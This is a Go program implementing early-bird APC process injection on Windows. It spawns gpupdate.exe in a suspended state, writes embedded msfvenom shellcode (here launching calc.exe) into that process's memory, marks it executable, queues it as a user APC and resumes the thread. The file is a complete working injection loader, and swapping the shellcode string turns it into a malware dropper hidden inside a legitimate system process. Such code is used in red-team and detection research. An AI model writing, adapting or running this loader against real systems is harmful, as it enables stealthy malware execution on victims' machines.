package main

import (
	"encoding/hex"
	"fmt"
	"syscall"

	"github.com/synzack/sys/windows"
)

func main() {
	//shellcode (msfvenom -a x64 -p windows/x64/exec CMD=calc.exe -f hex)
	scHex := "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c632e65786500"

	sc, err := hex.DecodeString(scHex)
	if err != nil {
		fmt.Println("Error in SC")
	}

	//Create process in suspended state
	si := new(windows.StartupInfo)
	pi := new(windows.ProcessInformation)

	command := syscall.StringToUTF16Ptr("C:\\Windows\\System32\\gpupdate.exe")

	errSyscall := windows.CreateProcess(nil, command, nil, nil, false, windows.CREATE_SUSPENDED, nil, nil, si, pi)
	if errSyscall != nil {
		fmt.Println(errSyscall)
	} else {
		fmt.Printf("[+] Successfully created process in suspended state, PID = %v\n", pi.ProcessId)
	}

	//OpenProcess to spawned process
	handle, openProcessError := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, pi.ProcessId)
	if openProcessError != nil {
		fmt.Println(openProcessError)
	} else {
		fmt.Printf("[+] Successfully opened handle to process, handle = %v\n", handle)
	}

	//VirtualAllocEx shellcode into suspended process
	addr, virtualAllocErr := windows.VirtualAllocEx(handle, 0, uintptr(len(sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if virtualAllocErr != nil {
		fmt.Printf("[-] Error: %v\n", virtualAllocErr)
	} else {
		fmt.Printf("[+] Successfully allocated memory at address: %v\n", addr)
	}

	//WriteProcessMemory shellcode into process
	writeProcessMemoryErr := windows.WriteProcessMemory(handle, addr, (&sc[0]), uintptr(len(sc)), nil)
	if writeProcessMemoryErr != nil {
		fmt.Printf("[-] Error: %v\n", writeProcessMemoryErr)
	} else {
		fmt.Printf("[+] Successfully wrote shellcode to memory\n")
	}

	//VirtualProtect to change permissions of shellcode memory space to read, execute
	var oldProtect uint32
	virtualProtectErr := windows.VirtualProtectEx(handle, addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect)
	if virtualProtectErr != nil {
		fmt.Printf("[-] Error: %v\n", virtualProtectErr)
	} else {
		fmt.Printf("[+] Successfully changed permissions of memory to read/execute\n")
	}

	//Create QueueUserAPC on shellcode
	userApcError := windows.QueueUserAPC(addr, pi.Thread, 0)
	if userApcError != nil {
		fmt.Printf("[-] Error: %v\n", userApcError)
	} else {
		fmt.Println("[+] Successfully initiated QueueUserAPC")
	}

	//Resume thread of suspended process
	_, resumeErr := windows.ResumeThread(pi.Thread)
	if resumeErr != nil {
		fmt.Printf("[-] Error resuming thread: %v\n", err)
	} else {
		fmt.Println("[+] Resume thread successful. Shellcode should execute.")
	}
}
